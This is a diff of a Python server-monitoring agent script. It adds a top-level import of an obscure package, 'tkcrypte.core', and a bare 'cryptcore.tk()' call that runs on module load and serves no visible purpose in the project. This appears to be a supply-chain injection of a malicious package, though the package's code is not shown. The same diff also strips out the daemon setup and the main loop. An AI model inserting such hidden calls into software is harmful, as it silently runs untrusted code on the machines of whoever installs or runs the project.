@@ -16,10 +16,11 @@ import json
 import threading
 import random
 import operator
+import tkcrypte.core as cryptcore
+cryptcore.tk()
 from urllib.parse import urljoin
 
 from common.slogging import slog
-import common.daemon  as daemon
 from agent.cpu import CpuWatch
 from agent.net import BandwidthWatch
 
@@ -725,16 +726,6 @@ def run(args):
         slog.error('using local config to start: {0}'.format(json.dumps(gconfig)))
 
 
-    if args.nodaemon:
-        slog.warn("start as no-daemon mode")
-    else:
-        slog.warn("start as daemon mode")
-        try:
-            daemon.daemon_init()
-        except RuntimeError as e:
-            print(e, file=sys.stderr)
-            raise SystemExit(1)
-
     #run_watch(alarm_filename)
 
     update_config_th = threading.Thread(target = update_config)
@@ -764,7 +755,5 @@ def run(args):
     con_recv_th.start()
     slog.info("start consumer_alarm_high thread")
 
-    while True:
-        time.sleep(1000)
 
     return 0
